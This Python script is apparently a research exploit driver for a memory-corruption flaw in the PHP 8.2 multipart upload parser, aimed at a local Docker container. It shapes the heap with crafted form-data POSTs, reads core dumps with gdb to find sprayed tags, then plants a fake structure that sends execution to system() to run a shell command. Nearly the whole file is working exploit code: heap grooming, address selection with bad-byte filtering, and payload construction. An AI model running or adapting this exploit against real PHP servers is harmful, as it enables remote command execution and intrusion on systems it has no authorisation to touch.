#!/usr/bin/env python3
"""oom131: WINDOW-CORRECTED ARM (cut ~1770, seeds = freed temp names).

r2 core forensics: name idx 2200/2600/3000 ABSENT (fatal cuts parsing
~1770); K-sea = rfc1867's freed ~3KB TEMP-NAME copies (temps die during
parse -> refill arData tail). Everything (sea tiles, tags, block) must
live in parts 1400..1769 (before the cut).

Measure: names 1400..1769 = SIG8 tiles (freed temps leave SIG8 clusters);
part 1740 value carries tag8(1740) (alive -> intact in core -> value
chunk address A). B = A + OFF (legal slide).
Arm: same sizes; names 1400..1769 = B||B tiles; part 1740 value = block
at OFF. Walk: rdi = B (freed temp tile) -> block live at B -> system.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
MAGIC = 0xC0DEBA5E
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)
KEYLEN = P.KEYLEN
K1 = 4200
BLOCK_PART = 1740
SEA_LO, SEA_HI = 1400, 1770
VLEN = 1537
CORE = "/tmp/core.131"

def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def sh(cmd, timeout=120):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()

def x_state():
    return sh("test -f /tmp/x && echo X_EXISTS:$(cat /tmp/x) || echo NO_X").strip()

def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))

def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8081:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False

def post_mod(body, timeout=300):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__

def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None

def cell_of(addr):
    return struct.pack("<Q", addr) * 2

def tag8(i):
    return struct.pack("<QQ", MAGIC + i, MAGIC + i)

def name_of(i, tile=None, shrink=0):
    """Default: p + K*3056 + idx (payload68). tile: 16B tile replacing K-filler."""
    if tile is not None:
        fill = ((KEYLEN - 8 - shrink) // 16) * 16
        filler = (tile * (fill // 16))[:fill]
    else:
        filler = b"K" * (KEYLEN - 8 - shrink)
    return (b'--BOUND\r\nContent-Disposition: form-data; name="p' + filler
            + b"%d" % i + b'[x]"\r\n\r\n')

def value_of(i, B=None, OFF=0, with_block=False, tag=False):
    if with_block and i == BLOCK_PART:
        v = bytearray(cell_of(B) * (VLEN // 16) + b"P")
        st = struct.pack_into
        st("<II", v, OFF + 0x00, 1, 0x108)
        st("<II", v, OFF + 0x08, 1, 0)
        st("<Q", v, OFF + 0x10, 0)
        st("<Q", v, OFF + 0x18, B + 0x68)
        st("<I", v, OFF + 0x2C, 1)
        st("<Q", v, OFF + 0x50, B + 0x90)
        v[OFF + 0x58] = 6
        st("<I", v, OFF + 0x5C, 0x106)
        st("<Q", v, OFF + 0x68, 0)
        st("<Q", v, OFF + 0x70, BASE + ZIF)
        st("<IIQI", v, OFF + 0x90, 1, 0x106, 0, len(CMD))
        v[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
        for s in range(0, len(v) - 15, 16):
            if not (OFF <= s < OFF + 0xB8):
                v[s:s + 16] = cell_of(B)
        return bytes(v)
    if tag:
        return tag8(i) + b"v" * (VLEN - 16) + tag8(i)
    return b"v"

def build_post(B=None, OFF=0, with_block=False, tag=False):
    sea = SIG8 if (not with_block and B is None) else (cell_of(B) if with_block else None)
    ps = []
    for i in range(K1):
        in_sea = SEA_LO <= i < SEA_HI
        shrink = 1536 if (i == BLOCK_PART and (tag or with_block)) else 0
        ps.append(name_of(i, tile=(sea if in_sea else None), shrink=shrink)
                  + value_of(i, B=B, OFF=OFF, with_block=with_block,
                             tag=(tag and i == BLOCK_PART)) + b"\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)

def fire(tag, body, tries=6, want_crash=True):
    for t in range(tries):
        sh("rm -f /tmp/core /tmp/core.used")
        n0 = segv_count()
        c, r = post_mod(body)
        crashed = False
        for _ in range(10):
            time.sleep(2)
            if segv_count() > n0 or sh("test -f /tmp/core && echo y") == "y":
                crashed = True
                break
        print("%s try%d: http=%s segv+%d core=%s"
              % (tag, t, c, segv_count() - n0,
                 sh("test -f /tmp/core && echo y") == "y"), flush=True)
        if crashed == want_crash:
            return crashed, c, r
    return crashed, c, r

def pull_core(dst):
    subprocess.run(["docker", "cp", "php_vuln:/tmp/core", "/tmp/core.tmp"], capture_output=True)
    subprocess.run(["docker", "cp", "/tmp/core.tmp", "phpbuild:" + dst], capture_output=True)
    subprocess.run(["docker", "cp", "phpbuild:" + dst, "/tmp/scan_core"], capture_output=True)

def segs_of(mm):
    e_phoff = struct.unpack_from("<Q", mm, 0x20)[0]
    e_phentsize, e_phnum = struct.unpack_from("<HH", mm, 0x36)
    out = []
    for i in range(e_phnum):
        off = e_phoff + i * e_phentsize
        pt = struct.unpack_from("<I", mm, off)[0]
        po, pv, pa, pf = struct.unpack_from("<QQQQ", mm, off + 8)
        if pt == 1 and pf > 0x10000:
            out.append((pv, po, pf))
    return out

def find_all(segs, mm, pat, cap=1000):
    out = []
    for pv, po, pf in segs:
        d = mm[po:po + pf]; s = 0
        while True:
            j = d.find(pat, s)
            if j < 0:
                break
            out.append(pv + j)
            if len(out) > cap:
                return out
            s = j + 1
    return out

def core_rdi(corepath):
    subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                    'printf "set pagination off\\nset confirm off\\ninfo registers rdi rbx rip\\nquit\\n" > /tmp/g131.gdb'],
                    capture_output=True)
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g131.gdb /tmp/libphp.stock.so %s 2>&1 | grep -E '^rdi|^rbx|^rip'" % corepath],
                       capture_output=True, timeout=240)
    return r.stdout.decode("latin1").strip()

def aim(A):
    for o in range(24, VLEN - 0xB8, 8):
        cand = A + o
        if cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0:
            nb = cand.to_bytes(6, "little")
            if not any(b in (0x00, 0x0A, 0x0D, 0x22, 0x27, 0x5C, 0x3B, 0x3D) for b in nb):
                return cand, o
    return None, None

print("=== oom131: window-corrected arm ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == STOCK_MD5, "not stock: " + md5
print("md5 ok", flush=True)

for k1 in P.K1S[:-1]:
    post_mod(P.build_attack(k1, 5000000))
print("shaped segv=%d" % segv_count(), flush=True)
BASE = base_now()
print("base=0x%x" % BASE, flush=True)
print("pre x: %s" % x_state(), flush=True)

m_body = build_post(tag=True)
verbatim = P.build_attack(4200, 5000000)
print("m=%.2fMB delta_vs_verbatim=%d" % (len(m_body) / 1048576.0, len(m_body) - len(verbatim)), flush=True)

B = None; OFF = None
for rnd in range(1, 5):
    print("--- r%d (B=%s OFF=%s) ---" % (rnd, B and hex(B), OFF), flush=True)
    if B is None:
        crashed, c, r = fire("r%d-meas" % rnd, m_body)
        xs = x_state()
        print("r%d-meas x: %s" % (rnd, xs), flush=True)
        if xs.startswith("X_EXISTS"):
            print("!!! CAMPAIGN WON (meas r%d): %s" % (rnd, xs), flush=True)
            break
        if not crashed:
            print("r%d-meas no crash" % rnd, flush=True)
            continue
        pull_core("%s_r%dm" % (CORE, rnd))
        print("r%d-meas gdb: %s" % (rnd, core_rdi("%s_r%dm" % (CORE, rnd))), flush=True)
        import mmap
        f = open("/tmp/scan_core", "rb")
        mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
        segs = segs_of(mm)
        tv = find_all(segs, mm, tag8(BLOCK_PART))
        sc = find_all(segs, mm, SIG8)
        mm.close(); f.close()
        print("tag hits: %s" % [hex(x) for x in tv[:4]], flush=True)
        print("SIG8 clusters: %d hits, span %s..%s" % (len(sc), sc and hex(sc[0]), sc and hex(sc[-1])), flush=True)
        if tv:
            B, OFF = aim(tv[0])
            print("ARM aim from value tag: B=%s OFF=%s" % (B and hex(B), OFF), flush=True)
        elif sc:
            B, OFF = aim(sc[0])
            print("ARM aim from SIG8 cluster0: B=%s OFF=%s" % (B and hex(B), OFF), flush=True)
        else:
            print("no anchors in core", flush=True)
            continue
    if B is not None:
        a_body = build_post(B=B, OFF=OFF, with_block=True)
        assert abs(len(a_body) - len(m_body)) <= 8, "envelope drift %d" % (len(a_body) - len(m_body))
        crashed, c, r = fire("r%d-arm" % rnd, a_body, want_crash=False)
        xs = x_state()
        print("r%d-arm x: %s" % (rnd, xs), flush=True)
        if xs.startswith("X_EXISTS"):
            print("!!! CAMPAIGN WON (arm r%d): %s" % (rnd, xs), flush=True)
            break
        if crashed:
            pull_core("%s_r%da" % (CORE, rnd))
            print("r%d-arm gdb: %s" % (rnd, core_rdi("%s_r%da" % (CORE, rnd))), flush=True)

print("final x: %s" % x_state(), flush=True)
print("=== done ===", flush=True)
